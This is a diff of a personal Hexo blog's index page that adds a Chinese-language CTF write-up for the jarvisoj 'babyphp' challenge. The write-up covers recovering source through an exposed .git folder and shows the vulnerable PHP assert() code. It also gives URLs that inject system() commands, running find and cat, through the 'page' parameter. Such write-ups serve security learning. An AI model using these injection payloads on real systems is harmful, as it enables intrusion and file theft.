@@ -9,7 +9,7 @@
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
   <meta property="og:type" content="website">
 <meta property="og:title" content="Hexo">
-<meta property="og:url" content="http://yoursite.com/index.html">
+<meta property="og:url" content="http://zmh2000829.github.io/index.html">
 <meta property="og:site_name" content="Hexo">
 <meta property="og:locale" content="en_US">
 <meta property="article:author" content="John Doe">
@@ -56,13 +56,97 @@
         <a id="nav-search-btn" class="nav-icon" title="Search"></a>
       </nav>
       <div id="search-form-wrap">
-        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://yoursite.com"></form>
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://zmh2000829.github.io"></form>
       </div>
     </div>
   </div>
 </header>
       <div class="outer">
         <section id="main">
+  
+    <article id="post-ctf-web" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2020/08/01/ctf-web/" class="article-date">
+  <time datetime="2020-08-01T13:41:31.000Z" itemprop="datePublished">2020-08-01</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2020/08/01/ctf-web/">ctf-web</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p><img src="/2020/08/01/ctf-web/E:%5C%E5%8D%9A%E5%AE%A2%5Csource_posts%5Cctf-web%5Cweb2.png" alt="web2"></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://zmh2000829.github.io/2020/08/01/ctf-web/" data-id="ckdbpulq50003c4vb90q4c6qz" class="article-share-link">Share</a>
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+  
+    <article id="post-ctf-web2" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2020/08/01/ctf-web2/" class="article-date">
+  <time datetime="2020-08-01T13:27:30.000Z" itemprop="datePublished">2020-08-01</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2020/08/01/ctf-web2/">ctf-web2</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h4 id="jarvisoj-babyphp"><a href="#jarvisoj-babyphp" class="headerlink" title="jarvisoj babyphp"></a><u>jarvisoj babyphp</u></h4><h6 id="1-git源码泄露"><a href="#1-git源码泄露" class="headerlink" title="1. .git源码泄露"></a>1. .git源码泄露</h6><h6 id="2-php基础"><a href="#2-php基础" class="headerlink" title="2. php基础"></a>2. php基础</h6><p><strong><em>理解.git源码泄露</em></strong>：</p>
+<p> <em>.git文件夹是在clone或者init一个项目后生成的，其含有HEAD、config、description、hooks/、info/、objects/、refs/等，几乎包含了让git可以正常使用的所有信息。可以利用.git文件来恢复某项目的源代码，因此在项目部署后忘记删除.git文件，会造成由于.git文件导致的源码泄露的情况。</em></p>
+<p><img src="/2020/08/01/ctf-web2/E:%5C%E5%8D%9A%E5%AE%A2%5Csource_posts%5Cctf-web2-1%5Cweb1.png" alt="web1"></p>
+<p>根据提示可以推测有.git源码泄露（<em>同样我们可以直接在网站后加.git/config直接检测是否有.git源码泄露）</em>，使用工具GitHack 在index.php中发现源代码。</p>
+<p><img src="/2020/08/01/ctf-web2/E:%5C%E5%8D%9A%E5%AE%A2%5Csource_posts%5Cctf-web2-1%5Cweb2.png" alt="web2"></p>
+<p>if (isset($_GET[‘page’])) {<br>    $page = $_GET[‘page’];<br>} else {<br>    $page = “home”;<br>}<br>$file = “templates/“ . $page . “.php”;<br>assert(“strpos(‘$file’, ‘..’) === false”) or die(“Detected hacking attempt!”);<br>assert(“file_exists(‘$file’)”) or die(“That file doesn’t exist!”);<br>?&gt;</p>
+<p>简单的php，直接用hackbar，get型注入构造XXXX/?page=XXXX，利用上篇文章的模板，直接先爆出含有flag名的文件<em><a href="http://web.jarvisoj.com:32798/?page=&#39;.system" target="_blank" rel="noopener">http://web.jarvisoj.com:32798/?page=&#39;.system</a>(“find / -name ‘flag</em>‘“)</p>
+<p><img src="/2020/08/01/ctf-web2/E:%5C%E5%8D%9A%E5%AE%A2%5Csource_posts%5Cctf-web2-1%5Cweb3.png" alt="web3"></p>
+<p>发现/opt/lampp/htdocs/templates/flag.php，正好是我们在GitHack得到的flag.php，继续构造<em><a href="http://web.jarvisoj.com:32798/?page=&#39;.system" target="_blank" rel="noopener">http://web.jarvisoj.com:32798/?page=&#39;.system</a>(“cat /opt/lampp/htdocs/templates/flag.php”).’</em></p>
+<p><img src="/2020/08/01/ctf-web2/E:%5C%E5%8D%9A%E5%AE%A2%5Csource_posts%5Cctf-web2-1%5Cweb4.png" alt="web4"></p>
+<p>直接右键看网页源代码找到了被注释的flag -&gt; 61dctf{8e_careful_when_us1ng_ass4rt}</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://zmh2000829.github.io/2020/08/01/ctf-web2/" data-id="ckdbpulq80004c4vbg1nma6gw" class="article-share-link">Share</a>
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
   
     <article id="post-ctf-web1" class="article article-type-post" itemscope itemprop="blogPost">
   <div class="article-meta">
@@ -113,7 +197,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2020/07/20/ctf-web1/" data-id="ckd4102cx0001iovbe2o367x2" class="article-share-link">Share</a>
+      <a data-url="http://zmh2000829.github.io/2020/07/20/ctf-web1/" data-id="ckdbpulq10002c4vbcl9ng0i9" class="article-share-link">Share</a>
       
       
     </footer>
@@ -162,7 +246,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2020/07/20/hello-world/" data-id="ckd4102de0002iovb4aej6xf6" class="article-share-link">Share</a>
+      <a data-url="http://zmh2000829.github.io/2020/07/20/hello-world/" data-id="ckdbpulq90005c4vbgnbx453w" class="article-share-link">Share</a>
       
       
     </footer>
@@ -190,7 +274,7 @@
   <div class="widget-wrap">
     <h3 class="widget-title">Archives</h3>
     <div class="widget">
-      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/07/">July 2020</a></li></ul>
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/08/">August 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/07/">July 2020</a></li></ul>
     </div>
   </div>
 
@@ -201,6 +285,14 @@
     <h3 class="widget-title">Recent Posts</h3>
     <div class="widget">
       <ul>
+        
+          <li>
+            <a href="/2020/08/01/ctf-web/">ctf-web</a>
+          </li>
+        
+          <li>
+            <a href="/2020/08/01/ctf-web2/">ctf-web2</a>
+          </li>
         
           <li>
             <a href="/2020/07/20/ctf-web1/">ctf-web1之基础</a>
